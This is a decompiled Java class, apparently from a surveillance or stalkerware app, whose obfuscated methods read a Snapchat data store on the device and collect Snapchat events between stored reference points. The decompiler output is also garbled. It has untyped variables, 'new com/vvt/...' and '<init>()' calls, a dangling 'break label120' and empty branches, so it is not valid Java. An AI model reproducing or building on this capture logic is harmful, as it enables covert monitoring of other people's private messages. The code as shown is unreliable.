package com.vvt.capture.snapchat.a;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.snapchat.c;
import com.vvt.capture.snapchat.d;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class h
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private long d = -1;
  private String e;
  private com.vvt.base.b f;
  
  public h(String paramString, com.vvt.base.b paramb)
  {
    this.e = paramString;
    this.f = paramb;
  }
  
  public g a()
  {
    l1 = -1;
    bool1 = a;
    if (bool1) {}
    l2 = 3000L;
    SystemClock.sleep(l2);
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    try
    {
      localObject = d.a();
      boolean bool2 = com.vvt.ag.b.a((String)localObject);
      if (bool2) {
        break label120;
      }
      bool1 = c.b((String)localObject);
      l2 = com.vvt.capture.snapchat.b.a(bool1);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject;
        boolean bool3;
        bool1 = c;
        if (bool1) {}
        l2 = l1;
        continue;
        this.d = l2;
      }
    }
    bool3 = l2 < l1;
    if (!bool3)
    {
      bool1 = b;
      if (bool1) {}
      l2 = this.d;
      localObject = Long.valueOf(l2);
      localFxSimpleEventReference.setReference((Long)localObject);
      bool1 = a;
      if (bool1) {}
      return localFxSimpleEventReference;
    }
  }
  
  public List a(int paramInt)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = d.a();
      boolean bool2 = com.vvt.ag.b.a((String)localObject);
      if (!bool2)
      {
        bool1 = c.b((String)localObject);
        long l1 = com.vvt.capture.snapchat.b.a(bool1);
        long l2 = 0L;
        bool1 = a;
        if (bool1) {}
        localObject = this.e;
        com.vvt.base.b localb = this.f;
        localObject = com.vvt.capture.snapchat.b.a((String)localObject, l2, l1, localb, paramInt);
        localArrayList.addAll((Collection)localObject);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = c;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = paramg1.getReference();
      localObject = (Long)localObject;
      long l1 = ((Long)localObject).longValue();
      localObject = paramg2.getReference();
      localObject = (Long)localObject;
      long l2 = ((Long)localObject).longValue();
      localObject = this.e;
      com.vvt.base.b localb = this.f;
      localObject = com.vvt.capture.snapchat.b.a((String)localObject, l1, l2, localb);
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/a/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */